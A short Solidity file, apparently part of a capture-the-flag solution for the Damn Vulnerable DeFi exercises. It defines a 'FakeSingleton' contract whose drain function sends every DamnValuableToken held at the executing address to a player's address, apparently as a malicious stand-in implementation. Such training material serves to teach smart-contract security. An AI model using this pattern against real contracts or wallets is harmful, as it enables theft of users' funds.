// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../DamnValuableToken.sol";

contract FakeSingleton {
    function drain(address _token, address _player) public {
        DamnValuableToken(_token).transfer(
            _player,
            DamnValuableToken(_token).balanceOf(address(this))
        );
    }
}
